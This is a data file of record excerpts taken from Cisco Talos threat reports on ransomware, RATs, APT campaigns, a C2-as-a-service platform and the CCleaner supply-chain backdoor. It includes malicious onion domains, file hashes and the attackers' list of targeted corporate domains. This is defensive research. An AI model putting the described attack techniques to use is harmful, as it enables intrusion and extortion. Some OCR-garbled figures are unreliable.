-- a portent for the future of ransomware. \nTraditionally, malware was never terribly concerned with the destruction of data or denial of access to its contents; With few notable exceptions, data loss was mostly a side-effect of malware campaigns. Most actors were concerned with sustained access to data or the resources a system provided to meet their objectives. Ransomware is a change to this paradigm from subversion of systems to outright extortion; actors are now denying access to data, and demanding money to restore access to that data. This paper will discuss the latest ransomware trends as well as how to defend your enterprise against this threat. ", "source": "Cisco"}, {"title": "Introduction", "content": "Ransomware is the name given to a class of malware whose end-goal is to deny access to user data by various means. Early variants would use various techniques to lock down access to the computer or deny access to files (e.g. modifying ACLs and disabling access to system tools, the desktop, etc.), while newer variants simply encrypt user files with strong encryption algorithms (e.g. AES, RSA, etc.). Ransomware specifically targets user files, while avoiding damage to system files. This is to both ensure that the user can be notified of what happened to their files, as well as providing a viable means for the user to pay the ransom in order to get their files back. Once the files are encrypted, the malware usually self-deletes and leaves behind a document of some sort. This document instructs the victim on how to provide payment and regain access to their files. Some variants display a countdown timer to the victim, threatening to delete the key/decryption tool if payment is not received before the timer reaches zero or, in other cases, increase the price of the ransom. \nRansomware is commonly delivered through exploit kits, waterhole attacks, malvertising, or mass phishing campaigns. Once delivered, ransomware typically identifies user files and data through some sort of an embedded file extension list. It is also programmed to avoid interacting with certain system directories (such as the WINDOWS system directory, or certain program files directories) to ensure system stability for delivery of the ransom after the payload finishes running. If the files are in a certain location and match one of the listed file extensions, encrypt the file. Otherwise, leave the file(s) alone. After the files have been encrypted, it typically leaves a notification for the user, with instructions on how to pay the ransom[1 ]. ", "source": "Cisco"}, {"title": "defense", "content": "As we have established in our narrative, in the hands of skilled attackers, ransomware with selfpropagating capabilities can become a nightmare. Just because it can happen, doesn't mean it has to. The scenario described was purposefully generic because by and large, most enterprise networks are architected in roughly the same manner. This means that our scenario can be applied almost universally regardless of target. Due to this homogeneity of enterprise network design, the question of \"What happens when attackers target us?\" results in the same answer: If solid perimeter defense is not present, then initial access is established. If initial access is established and the threat is allowed to move laterally within the network, their privileges escalate and they map the network for access to assets that help them achieve their goals. If the privileges are allowed to escalate, it results in a complete compromise and loss of service for the targeted organization after the ransomware is deployed. The question then becomes: What happens when attackers are no longer content with attacking hospitals opportunistically, but then sets their sights on a different organization, or a different vertical? Power, gas, water, shipping, air traffic control? Now more than ever, defense in depth is more than a concept, more than just words that have been preached for decades, it becomes necessary practice. \nWhat follows is a collection of risk mitigation strategies. While none of these methods are new, when combined, these defensive techniques and methods allow resiliency against initial access, and the ability to contain the threat if they successfully gain initial access. ", "source": "Cisco"}, {"title": "Conclusion", "content": "The past few years have seen a dramatic uptick in ransomware variants and their deployment on a global scale due. Cyber criminals see an easy opportunity for profit. It is inevitable that these adversaries would look to the past for effective malware behaviors to advance the efficacy of ransomware. Combined with new methodologies in targeting, we anticipate a trend towards ransomware that can self propagate and move semi-autonomously throughout a network to devastating effect. \nTo emphasize this, one need look no further than SamSam.exe, the malware sample recovered from a number of scattered enterprise network breaches mainly targeting the healthcare vertical. SamSam isn't complex, and it not fully self-sufficient, but it does exhibit some of the behaviors of a successful worm - rapid propagation, payload delivery (ransomware), and crippling recovery efforts. The age of self-propagating ransomware, or \"cryptoworms\", is right around the corner. \nFor too long, critical security controls and best practice for enterprise network security has been publicly praised and privately ignored. Drop-in appliances and security solutions can only do so much to protect the network, and will do little to stop this threat if networks continue to be architected and expanded without defense in depth in mind. If enterprises don't start making strides towards defensible architecture today, massive ransoms may end up getting paid tomorrow. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Asheer Malhotra, Vitor Ventura \nMONDAY, JANUARY 31, 2022 08:00\nTHREAT SPOTLIGHT\nCisco Talos has observed a new campaign targeting Turkish private organizations  alongside governmental institutions. \nTalos attributes this campaign with high confidence to MuddyWater - an APT group recently attributed to Iran's Ministry of Intelligence and Security (MOIS) by the U.S. Cyber Command.   \nThis campaign utilizes malicious PDFs, XLS files and Windows executables to deploy malicious PowerShellbased downloaders acting as initial footholds into the target's enterprise. MuddyWater's use of script based components such as obfuscated PowerShell based downloaders is also a tactic described in the advisory from January 2021 by the U.S. Cyber Command.   \nThis campaign also utilizes canary tokens to track successful infection of targets, a new addition to this group's arsenal of tactics, techniques and procedures (TTPs). \nThis specific method of taking advantage of canary tokens in this campaign may also be a measure to evad sandbox based detection systems. \nA highly motivated threat actor such as MuddyWater can use unauthorized access to conduct espionage, intellectual property theft and deploy ransomware and destructive malware in an enterprise. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Talos has observed Iranian related groups carry out malicious campaigns all over the world in recent years. 2021 was also prolific in cybersecurity incidents targeting Iranian state-run organizations. These events were attributed to Western nations by the Iranian regime, with the promise of revenge. It's hard to say if these campaigns are the result of such promises or just part of MuddyWater's usual activity. \nHowever, the fact that the threat actors have changed some of their methods of operation and tools is another sign of their adaptability and unwillingness to refrain themselves from attacking other nations. In this post we have shown the same group running two different campaigns using different tools while targeting the same country, in this case Turkey, showing their capacity and motivation to compromise their targets and perform their espionage activities. \nIn-depth defense strategies based on a risk analysis approach can deliver the best results in the prevention. However, this should always be complemented by a good incident response plan which has been not only tested with table top exercises and reviewed and improved every time it's put to the test on real engagements. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Craig Williams \nFRIDAY, MARCH 20, 2015 07:57 \nThis post was authored by Andrea Allievi, Ben Baker, Nick Biasini, JJ Cummings, Douglas Goddard, William Largent, Angel Villegas, and Alain Zidouemba \nCisco's Security Solutions (CSS) consists of information security experts with a unique blend of law enforcement, enterprise security and technology security backgrounds. The team works directly with Cisco's Talos Security Intelligence & Research Group to identify known and unknown threats, quantify and prioritize risk, and minimize future risk. \nWhen consumers make purchases from a retailer, the transaction is processed through Point-of-Sale (PoS) systems. When a credit or debit card is used, a PoS system is used to read the information stored on the magnetic stripe on the back of the credit card. Once this information gets stolen from a merchant, it can be encoded into a magnetic stripe and used with a new card. Criminal markets exist for this valuable information because the attackers are able to easily monetize stolen credit card data. Incidents involving PoS malware have been on the rise, affecting many large organizations as well as small mom-and-pop establishments and garnering a lot of media attention. The presence of large amounts of financial and personal information ensures that these companies and their retail PoS systems will remain attractive targets. \nimage14 ", "source": "Cisco"}, {"title": "Conclusion", "content": "PoSeidon is another in the growing number of Point-of-Sale malware targeting PoS systems that demonstrate the sophisticated  techniques and approaches of malware authors. Attackers will continue to target PoS systems and employ various obfuscation techniques in an attempt to avoid detection. As long as PoS attacks continue to provide returns, attackers will continue to invest in innovation and development of new malware families. Network administrators will need to remain vigilant and adhere to industry best practices to ensure coverage and protection against advancing malware threats. \nSnort Rules: 33836-33852. Please refer to Defense Center or FIREsight management console for updated information. ", "source": "Cisco"}, {"title": "Introduction", "content": "With internet-sharing applications, or \"proxyware,\" users download software that allows them to share a percentage of their bandwidth with other internet users for a fee, with the companies that created this software acting as a gobetween. \nAs proxyware has grown in popularity, attackers have taken notice and are now attempting to exploit this interest to monetize their malware campaigns. \nMalware is currently leveraging these platforms to monetize the internet bandwidth of victims, similar to how malicious cryptocurrency mining attempts to monetize the CPU cycles of infected systems. \nIn many cases, these applications are featured in multi-stage, multi-payload malware attacks that provide adversaries with multiple monetization methods. \nTrojanized installers are some of the most common threats taking advantage of public interest in proxyware to infect victims. \nThese applications pose significant privacy and operational risks to organizations as they may allow nefarious or abusive network traffic to appear as if it originates from their corporate networks resulting in reputational damages that may also lead to service disruption. ", "source": "Cisco"}, {"title": "Conclusion", "content": "These relatively new platforms were built with a legitimate purpose, but attackers quickly found ways to abuse them. It's not the first time we have documented abuses of legitimate platforms - a good example is the research we posted about the abuse of the Discord and Slack content delivery networks. We believe attackers are highly likely to abuse these proxyware platforms, as they can be used to disguise an attacker's origin more efficiently than Tor, since the exit nodes cannot be cataloged. For organizations, these platforms pose two essential problems: The abuse of their resources, eventually being blocklisted due to activities they don't even control and it increases organizations attack surface, potentially creating an initial attack vector directly on the endpoint. \nThese platforms also pose new challenges for researchers, since there is no way to identify a connection through these kinds of networks - the origin IP becomes even less meaningful in an investigation. Due to the various risks associated with these platforms, it is recommended that organizations consider prohibiting the use of these applications on corporate assets. In most cases, endpoints should not be communicating with the networks associated with these platforms, and organizations should consider deploying comprehensive logging and alerting mechanisms to ensure that they can effectively detect and respond when systems within the environment begin communicating with them as this could be an indicator that the system has been compromised. ", "source": "Cisco"}, {"title": "Introduction", "content": "Talos is continuously analyzing email based malware always looking at how adversaries change and the new techniques that are being added on an almost constant basis. Recently we noticed some novel ways that adversaries are leveraging Google and Tor2Web proxies to spread a ransomware variant, Cerber 5.0.1. \nThis particular campaign looks to have started on November 24th and has been ongoing for the past several days. This campaign did not use advanced techniques that we sometimes see used by adversaries that include well written, professional looking emails, with legitimate signature blocks or other identifying characteristics. In this campaign, the emails were anything but professional. However, they did vary significantly with what we typically see from a ransomware distribution perspective. \nToday, spam based ransomware infections are heavily skewed toward Locky. The majority of spam messages we see today are affiliates producing large amounts of spam that leverage various types of script-based file extensions to download the Locky executable and infect systems. This campaign looked different in that the messages didn't contain an attachment and were extremely short and basic. What we found was a potential next evolution for ransomware distribution that relies more heavily on Tor to obfuscate their activity and hinder the ability to shut down servers that are hosting the malicious content. ", "source": "Cisco"}, {"title": "Indicators of Compromise", "content": "Email Subjects (Some Customization to Individual Usernames was found):   \nHi   \nHow are you   \nHowdy   \nHello   \nHey   \nWhats up \nDomains: pvjk6aukijrdwwqs[.]onion[.]to efi66ap2ffu2ossu[.]onion[.]to \nHashes: eb421e0e413f49d678830fdbc53600ea14b0b4a03ee1d169651d4843bb54b388 (SHA256) 25de266140cee7ac48192ddf80d7477cc8081685933491eb0fff32198fb4b07e (SHA256) ", "source": "Cisco"}, {"title": "Conclusion", "content": "The Cerber ransomware family has continued to evolve very rapidly over the past several months. This latest distribution campaign highlights how ransomware based threats are continuing to evolve and mature over time, and shows an increasingly sophisticated infection process as attackers continue to implement new methods to attempt to evade detection and make analysis more difficult. Cerber continues to release new versions very quickly and will likely continue to do so in the future. This campaign demonstrates the importance of ensuring that organizations use defense-in-depth defensive architectures to protect their environments as well as the importance of ensuring that employees are properly trained on the email-based threats and proper hygiene. \nTor is a useful way to browse the web anonymously. However, adversaries are leveraging it heavily to distribute and host malicious content. In this particular instance if all Tor2Web and Tor traffic were blocked the threat would be largely mitigated. Organizations need to decide if the business case for allowing Tor and Tor2Web on the network outweighs the potential risks to its users. ", "source": "Cisco"}, {"title": "Introduction", "content": "https://blog.talosintelligence.com/vulnerability-deep-dive-tp-link/ \nTP-Link recently patched three vulnerabilities in their TL-R600VPN gigabit broadband VPN router, firmware version 1.3.0. Cisco Talos publicly disclosed these issues after working with TP-Link to ensure that a patch was available. Now that a fix is out there, we want to take the time to dive into the inner workings of these vulnerabilities and show the approach we took with our proof-ofconcept code. ", "source": "Cisco"}, {"title": "Background", "content": "The TP-Link TL-R600VPN is a five-port small office/home office (SOHO) router. This device contains a Realtek RTL8198 integrated system on a chip. This particular chip uses an offshoot of the MIPS-1 architecture developed by Lexra. Except for a few proprietary instructions for handling unaligned load and store operations, these two instruction sets are essentially the same. The instructions that are not included in Lexra are LWL, SWL, LWR, and SWR. These proprietary instructions are often used when compiling a program for the more common MIPS-1 architecture and cause a segfault when encountered in Lexra. The knowledge of this key difference is imperative to assembling working code for the target. \nFor more information about Lexra MIPS and its differences with the MIPS-1 architecture, refer to 'The Lexra Story' and the MIPS-1 patent filing. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Unfortunately, these types of vulnerabilities are all to common in IoT devices. Attackers can find these issues and weaponize them to execute code on vulnerable devices. It is imperative that everyone realizes that IoT devices are computers, and like all computers, the software must be maintained to ensure the device is as secure as possible. \nTalos will continue to discover and responsibly disclose vulnerabilities, working with vendors to ensure that customers are protected and provide additional deep-dive analysis when necessary. Finding and disclosing zero-day vulnerabilities via coordinated disclosure helps improve the overall security of the devices and software people use on a day-to-day basis. Talos is committed to this effort, developing programmatic ways to identify problems or flaws that could be otherwise exploited by malicious attackers. \nFor vulnerabilities Talos has disclosed, please refer to our vulnerability report portal. \nYou can also review our vulnerability disclosure policy here \nRELATED CONTENT ", "source": "Cisco"}, {"title": "Introduction", "content": "Over the past several months, Cisco Talos has observed a malware campaign that utilizes websites hosting a new version of Loda, a remote access trojan (RAT) written in AutoIT. \nThese websites also host malicious documents that begin a multi-stage infection chain which ultimately serves a malicious MSI file. The second stage document exploits CVE-2017- 11882 to download and run the MSI file, which contains Loda version 1.1.1. \nThis campaign appears to be targeting countries in South America and Central America, as well as the U.S. \nWhat's New? \nTalos has observed several changes in this version of Loda. The obfuscation technique used within the AutoIT script changed to a different form of string encoding. Multiple persistence mechanisms have been employed to ensure Loda continues running on the infected host following reboots. Lastly, the new version leverages WMI to enumerate antivirus solutions running on the infected host. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Although the functionality of this new version of Loda is similar to previous versions, this new iteration is a slightly more well-developed RAT. Loda is simple yet has proven to be effective, and poses a serious threat to an infected host. The credential stealing capabilities could lead to significant financial loss or a potential data breach. By changing the obfuscation techniques the threat actor was able to lower the detection rate considerably. The change in persistence mechanisms and AV solution detection show that the malware authors are actively improving the functionality of Loda. \nCoverage \nSnort [SID] 53031 ", "source": "Cisco"}, {"title": "Introduction", "content": "By Nick Biasini \nTUESDAY, OCTOBER 24, 2017 16:51 \nRANSOMWARE \nNote: This blog post discusses active research by Talos into a new threat. This information should be considered preliminary and will be updated as research continues. \nUpdate 2017-10-26 16:10 EDT: added additional information regarding the links between Nyetya and BadRabbit \nUpdate 2017-10-26 09:20 EDT: added additional information regarding the EternalRomance exploit \nUpdate 2017-10-25: added additional information regarding encryption and propagation methods \nOn October 24, 2017, Cisco Talos was alerted to a widescale ransomware campaign affecting organizations across eastern Europe and Russia. As was the case in previous situations, we quickly mobilized to assess the situation and ensure that customers remain protected from this and other threats as they emerge across the threat landscape. \nThere have been several large scale ransomware campaigns over the last several months. This appears to have some similarities to Nyetya in that it is also based on Petya ransomware. Major portions of the code appear to have been rewritten. The distribution does not appear to have the sophistication of the supply chain attacks we have seen recently. ", "source": "Cisco"}, {"title": "Conclusion", "content": "This is yet another example of how effective ransomware can be delivered leveraging secondary propagation methods such as SMB to proliferate. In this example the initial vector wasn't a sophisticated supply chain attack. Instead it was a basic drive-by-download leveraging compromised websites. This is quickly becoming the new normal for the threat landscape. Threats spreading quickly, for a short window, to inflict maximum damage. Ransomware is the threat of choice for both its monetary gain as well as destructive nature. As long as there is money to be made or destruction to be had these threats are going to continue. \nThis threat also amplifies another key area that needs to be addressed, user education. In this attack the user needs to facilitate the initial infection. If a user doesn't help the process along by installing the flash update it would be benign and not wreak the devastation it has across the region. Once a user facilitates the initial infection the malware leverages existing methods, such as SMB, to propagate around the network without user interaction. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Cisco Talos \nTUESDAY, APRIL 5, 2022 08:00\nTHREAT SPOTLIGHT\nBy Edmund Brumaghin, with contributions from Alex Karkins. \nOngoing malware distribution campaigns are using ISO disk images to deliver AsyncRAT, LimeRAT and other commodity malware to victims. ", "source": "Cisco"}, {"title": "Detection", "content": "These campaigns appear to be linked to a new version of the 3LOSH crypter, previously covered here. \nMalware distributors often leverage tools to obfuscate their binary payloads and make detection and analysis more difficult. These tools often combine functionality normally associated with packers and crypters and, in many cases, are not directly tied to the malware payload itself. Over the past several months we have observed a series of campaigns that leverage a new version of one of these tools, referred to as 3LOSH crypter. The threat actor(s) behind these campaigns have been using 3LOSH to generate the obfuscated code responsible for the initial infection process. Based on analysis of the embedded configuration stored within the samples associated with these campaigns, we have identified that the same operator is likely distributing a variety of commodity RATs, such as AsyncRAT and LimeRAT. These RATs feature various functionality that enables them to be used to gain access to systems and exfiltrate sensitive information from victims. ", "source": "Cisco"}, {"title": "Conclusion", "content": "These malware distribution campaigns have been ongoing for the past several months, with new samples being uploaded to public repositories on a daily basis. The 3LOSH crypter continues to be actively maintained and improved by its author and will likely continue to be used by various threat actors attempting to evade detection in corporate environments. Organizations should be aware that even commodity malware can take advantage of the complexity and evasiveness offered by crypters to increase their operational effectiveness as adversaries attempt to leverage them to achieve their mission objectives. A layered defense-in-depth security architecture should be implemented to ensure that organizations maintain the ability to successfully defend against these threats. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Earl Carter \nTUESDAY, JULY 19, 2016 17:42 \nVULNERABILITY SPOTLIGHT\nVulnerabilities discovered by Tyler Bohan of Cisco Talos. \nMany of the wide variety of file formats are designed for specialized uses within specific industries. Apple offers APIs as interfaces to provide a definitive way to access image data for multiple image formats on the Apple OS X platform. Talos is disclosing the presence of five ", "source": "Cisco"}, {"title": "Conclusion", "content": "Image files are an excellent vector for attacks since they can be easily distributed over web or email traffic without raising the suspicion of the recipient. These vulnerabilities are all the more dangerous because Apple Core Graphics API, Scene Kit and Image I/O are used widely by software on the Apple OS X platform. \nOrganizations should patch software to the latest release in order to resolve these vulnerabilities To protect our customers, Talos has released Snort rules to detect attempts at exploiting these vulnerabilities. Additionally, organizations may wish to consider blocking files at network gateways if the file is of a type that is never, or very rarely, going to be encountered within the legitimate business of the organization. \nPlease note that additional rules may be released at a future date and current rules are subject to change pending additional vulnerability information. For the most current rule information, please refer to your Defense Center, FireSIGHT Management Center or Snort.org. \nSnort Rules: 16222,39634-39635,39597-39632 \nFor further zero day or vulnerability reports and information visit: http://talosintelligence.com/vulnerability-reports/ \nRELATED CONTENT \nBadgerboard: A PLC backplane network visibility module M A R C H 5 , 2 0 2 4 1 5 : 3 0 \nAnalysis of the traffic between networked devices has always been of interest since devices could even communicate with one another.  As the complexity of networks grew, the more useful dedicated traffic analysis tools became. Major advancements have been made over the years with tools like Snort or Wireshark, but these \nThe many vulnerabilities Talos discovered in SOHO and industrial wireless routers post-VPNFilter \nAU G U S T 2 , 2 0 2 3 0 8 : 0 0 \nGiven the privileged position these devices occupy on the networks they serve, they are prime targets for attackers, so their security posture is of paramount importance. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Nick Biasini \nMONDAY, AUGUST 8, 2022 08:42\nON THE RADAR \nTHREATS \nThe cybersecurity industry tends to focus on extremely large-scale or sophisticated, statesponsored attacks. Rightfully so, as it can be the most interesting, technically speaking. \nWhen most people think of cybercrime they think of large-scale breaches because that's what dominates the headlines. However, the problem is much bigger. In 2021, the Internet Crime Complaint Center (IC3) received a staggering 847,376 complaints, with each victim losing a little more than \\$8,000 on average. Once you account for the high-value breaches, the true impact is even lower. The average person is far more likely to have their identity stolen or fall victim to some other sort of scam than be directly affected by a large-scale breach - and business is booming. \nA deeper look at the data from IC3 shows that the amount of complaints and revenue being generated from cybercrime continues to rise. Interestingly there is a huge jump in cybercrime during the pandemic with a staggering increase of more than $\\big\\textcircled{\\le}\\big\\textcircled{6}$ in complaints between 2019 and 2020, with it increasing further in 2021. It's clear that cybercrime is on the rise, but what's driving it? ", "source": "Cisco"}, {"title": "Conclusion", "content": "As we've seen repeatedly over the years, we don't typically see new types of crime, just crime taking new forms. The world today is run by technology and it is becoming an ever-increasing part of our lives, as such, criminal activity is bound to increase. Criminals may seem like they are just out to commit crimes, but in reality, most criminals are choosing to live a life of crime to \nsupport themselves and their families. They, like anyone else, are familiar with risk assessment and now it may make more sense to commit crime with a keyboard instead of selling drugs as the risks are lower across the board. It's a lot less likely to draw immediate law enforcement response and there typically aren't turf wars in cyberspace and if they are they tend to be less violent. Furthermore. the margins in cybercrime are significant and in the end the goal is to make as much money as quickly as possible: technology is the key to scale and speed. \nLaw enforcement, especially at the local level, is going to need to evolve along with the criminals as they are tasked with protecting the general public. The future criminal is going to be aware of operational security and technologies like Tor to make their arrests increasingly difficult. The time is now to start building the capabilities into police departments to be able to handle the shift that has already been happening for a decade but is poised to explode, as people have been locked away for several years during the pandemic. The question becomes - how did criminals make use of that time? \nRELATED CONTENT ", "source": "Cisco"}, {"title": "Introduction", "content": "The threat actor behind StrongPity is not deterred despite being exposed multiple times over the past four years.   \nThey continue to expand their victimology and attack seemingly non related countries. This kind of continuous improvement suggests there is a possibility that this is an exported solution for other actors to use. ", "source": "Cisco"}, {"title": "Conclusion", "content": "The PROMETHIUM threat actor is dedicated and resilient, exposing them hasn't refrained them from moving forward with their agenda. After first being documented, they changed their toolkit but not their techniques or procedures. Since then, their toolkit has been the same, with just enough updates to keep their activities as efficient as possible. During this period, the victimology has expanded behind their initial focus in Europe and Middle East to a global operation targeting organizations on most continents. \nThese characteristics can be interpreted as signs that this threat actor could in fact be part of an enterprise service for hire operation. We believe this has hallmarks a professionally packaged solution due to the similarity of each piece of malware being extremely similar but used across different targets with minor changes. \nAdditionally, as explained by Citizen Lab, we saw in the past a lawful Interception tool was used instead of StrongPity. This usage could corroborate our theory. \nCoverage \nWays our customers can detect and block this threat are listed below. \nAdvanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors. Exploit Prevention present within AMP is designed to protect customers from unknown attacks such as this automatically. \nCisco Cloud Web Security (CWS) or Web Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks. \nEmail Security can block malicious emails sent by threat actors as part of their campaign. \nNetwork Security appliances such as Next-Generation Firewall (NGFW), Next-Generation Intrusion Prevention System (NGIPS), Cisco ISR, and Meraki MX can detect malicious activity associated with this threat. \nAMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products. \nUmbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network. \nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. \nIOCs ", "source": "Cisco"}, {"title": "Introduction", "content": "By Cisco Talos \nTHURSDAY, AUGUST 4, 2022 08:00\nTHREAT SPOTLIGHT\nBy Edmund Brumaghin, Azim Khodjibaev and Matt Thaxton, with contributions from Arnaud Zobec. \nExecutive Summary https://blog.talosintelligence.com/dark-utilities/ \nDark Utilities, released in early 2022, is a platform that provides full-featured C2 capabilities to adversaries. \nIt is marketed as a means to enable remote access, command execution, distributed denialof-service (DDoS) attacks and cryptocurrency mining operations on infected systems. Payloads provided by the platform support Windows, Linux and Python-based   \nimplementations and are hosted within the Interplanetary File System (IPFS), making them resilient to content moderation or law enforcement intervention.   \nSince its initial release, we've observed malware samples in the wild leveraging it to facilitate remote access and cryptocurrency mining. \nWhat is \"Dark Utilities?\" \nIn early 2022, a new C2 platform called \"Dark Utilities\" was established, offering a variety of services such as remote system access, DDoS capabilities and cryptocurrency mining. The operators of the service also established Discord and Telegram communities where they provide technical support and assistance for customers on the platform. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Although the Dark Utilities platform was recently established, thousands of users have already been enrolled and joined the platform. Given the amount of functionality that the platform provides and the relatively low cost of use, we expect this platform will continue to rapidly expand its user base. This will likely result in an increase in the volume of malware samples in the wild attempting to establish C2 using the platform. Organizations should be aware of these C2aaS platforms and ensure that they have security controls in place to help protect their environments. These platforms provide a variety of sophisticated capabilities to adversaries who may otherwise be unable to develop them on their own. They effectively lower the barrier to entry for cybercriminals entering the threat landscape and enable them to quickly begin launching attacks targeting a variety of operating systems. They also offer multiple methods that can be used to further monetize access gained to systems in corporate environments and could lead to further deployment of malware in the environment once initial access has been obtained. ", "source": "Cisco"}, {"title": "Introduction", "content": "https://blog.talosintelligence.com/ccleaner-c2-concern/ \nTalos recently published a technical analysis of a backdoor which was included with version 5.33 of the CCleaner application. During our investigation we were provided an archive containing files that were stored on the C2 server. Initially, we had concerns about the legitimacy of the files. However, we were able to quickly verify that the files were very likely genuine based upon the web server configuration files and the fact that our research activity was reflected in the contents of the MySQL database included in the archived files. \nIn analyzing the delivery code from the C2 server, what immediately stands out is a list of organizations, including Cisco, that were specifically targeted through delivery of a second-stage loader. Based on a review of the C2 tracking database, which only covers four days in September, we can confirm that at least 20 victim machines were served specialized secondary payloads. Below is a list of domains the attackers were attempting to target. Not all companies identified in the targets .php file were seen communicating with a secondary C2 or had a secondary payload deployed. \n\\$DomainList = array(   \n\"singtel.corp. root\"\"   \n\"htcgroup.corp\"   \n\"samsung-breda\"\"   \n\"Samsung\",   \n\"SAMSUNG. SEPM\"   \n\"samsung.sk\"   \n\"jp.sony.com\"\"   \n\"am.sony.com\"   \n\"gg-gauselmann.com\".   \n\"vmware. com\"   \n\"ger.corp.intel.com\"   \n\"amr.corp.intel.com\"   \n\"ntdev.corp.microsoft.com \"cisco.com\" \n\"uk.pri.o2.com' \"vf-es.internal.vodafone.com' \n\"linksys\",   \n\"apo.epson.net\",   \n\"msi.com.tw\",   \n\"infoview2u.dvrdns.org   \n\"dfw01.corp.akamai.com'   \n\"hq.gmail.com\",   \n\"dlink.com\" \n\"test.com\"); \nInterestingly the array specified contains Cisco's domain (cisco.com) along with other high-profile technology companies. This would suggest a very focused actor after valuable intellectual property. \nThese new findings raise our level of concern about these events, as elements of our research point towards a possible unknown, sophisticated actor. These findings also support and reinforce our previous recommendation that those impacted by this supply chain attack should not simply remove the affected version of CCleaner or update to the latest version, but should restore from backups or reimage systems to ensure that they completely remove not only the backdoored version of CCleaner but also any other malware that may be resident on the system. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Supply chain attacks seem to be increasing in velocity and complexity. It's imperative that as security companies we take these attacks seriously. Unfortunately, security events that are not completely understood are often downplayed in severity. This can work counter to a victim's best interests. Security companies need to be conservative with their advice before all of the details of the attack have been determined to help users ensure that they remain protected. This is especially true in situations where entire stages of an attack go undetected for a long period of time. When advanced adversaries are in play, this is especially true. They have been known to craft attacks that avoid detection by specific companies through successful reconnaissance techniques. \nIn this particular example, a fairly sophisticated attacker designed a system which appears to specifically target technology companies by using a supply chain attack to compromise a vast number of victims, persistently, in hopes to land some payloads on computers at very specific target networks. ", "source": "Cisco"}, {"title": "Introduction", "content": "Talos is constantly monitoring the threat landscape in an effort to identify changes in the way attackers are attempting to target organizations around the world. We identified a unique malware campaign that was distributed via malicious Word documents. The campaign appeared to be targeting victims in Portugal. The malware being distributed was interesting for a variety of reasons. As the author of this malware refers to it as \"Athena\" in their source code working directory and the fact that the C2 domain used by the malware begins with \"athena\", we have identified this malware as \"AthenaGo\". We were unable to locate a detailed analysis of this particular malware. \nAthenaGo appears to be a Remote Access Trojan (RAT) that also features the capability to download and run additional binaries on infected systems when instructed to do so by an attacker. The malware was written using the Go programming language. Windows-based malware written in Go is not commonly seen in the wild. Additionally the command and control (C2) communications used by the malware made use of Tor2Web proxies, which is part of a trend of increased reliance on these proxying services by various malware authors. As this was an interesting/unique infection chain, Talos decided to examine the malware itself as well as the campaigns that were distributing it. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Malware authors will continue to evolve their attacks as they identify ways to effectively reduce their risk of being caught. This includes relying on C2 infrastructure hosted on Tor, making use of varying levels of encryption to protect the nature and content of network communications with their malware, and limiting their attacks to targeted attacks against specific targets or demographics. AthenaGo is an example of changes in the way malware is being written in an attempt to evade network defenses and successfully compromise target environments. Talos continues to monitor changes within the threat landscape to ensure that customers remain protected as these techniques evolve over time. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Holger Unterbrink \nTHURSDAY, DECEMBER 10, 2015 11:11 \nRANSOMWARE \nThis post is authored byAndrea Allievi and Holger Unterbrink with contributions from Warren Mercer. \nExecutive Summary Over the past year, Talos has devoted a significant amount of time to better understanding how ransomware operates, its relation to other malware, and its economic impact. This research has proven valuable for Talos and led the development of better detection methods within the products we support along with the disruption of adversarial operations. \nCryptoWall is one ransomware variant that has shown gradual evolution over the past year with CryptoWall 2 and Cryptowall 3. Despite global efforts to detect and disrupt the distribution of CryptoWall, adversaries have continued to innovate and evolve their craft, leading to the release of CryptoWall 4. In order to ensure we have the most effective detection possible, Talos reverse engineered CryptoWall 4 to better understand its execution, behavior, deltas from previous versions and share our research and findings with the community. \nFor readers that may not be familiar, ransomware is malicious software that is designed to hold users' files (such as photos, documents, and music) for ransom by encrypting their contents and demanding the user pay a fee to decrypt their files. Typically, users are exposed to ransomware via email phishing campaigns and exploit kits. The core functionality of CryptoWall 4 remains the same as it continues to encrypt users' files and then presents a message demanding the user pay a ransom. However, Talos observed several new developments in CryptoWall 4 from previous versions. For example, several encryption algorithms used for holding users' file for ransom have changed. Also, CryptoWall 4 includes a new technique to disable and delete all automatic Windows backup mechanisms, making it almost impossible to recover encrypted files without having an external backup. Finally, CryptoWall 4 has been observed using undocumented API calls not previously used to find the local language settings of the compromised host. These are just a few of the new findings Talos observed in the new iteration of CryptoWall that are detailed further in this post. \nFor our technically savvy users, we encourage you to continue reading. As always, we strongly encourage users and organizations to follow recommended security practices and to employ multiple layers of detection in order to reduce the risk of compromise. Our in-depth analysis of the latest CryptoWall version gives us a better opportunity to protect our users by allowing us to identify better detection methods. Finally, as a note regarding recent statements by the FBI informing users that they should just pay the ransom if they have no alternative, Talos strongly encourages users to not pay the ransom as doing so directly funds this malicious activity. ", "source": "Cisco"}, {"title": "Conclusion", "content": "In this analysis we have put CryptoWall 4 under the microscope. The dropper doesn't bring anything terribly innovative, but it still has some clever features. The weak point in the infection process is that it deeply relies on the C2 server communication. If a firewall or IPS is able to detect and block its communication packets, the infection will not be able to operate correctly because it doesn't have any public key needed to properly encrypt the victim files. However, once CryptoWall 4 has encrypted the victim's files, there is no known way to recover the private key and decrypt them without paying the ransom as the RSA private key is never managed by the victim's workstation. The private key resides only on the adversaries' infrastructure. \nAs our analysis shows, the adversaries behind CryptoWall have continued to innovate and evolve to ensure it remains effective against users. Addressing the overall threat that ransomware presents requires organizations to be aware that adversaries will continue to evolve. Utilizing a multi-layered defensive approach will help organizations be able to detect and protect against threats like CryptoWall. Talos will continue to monitor CryptoWall as it evolves to identify better detection methods and build better defenses to protect our customers. We strongly encourage users and organizations to follow recommended security practices, such as installing security patches as they become available, exercising caution when receiving messages from unknown third-parties, and ensuring a robust backup solution is in place. These practices will help reduce the threat of a compromise and should aid in the recovery of any such attack. 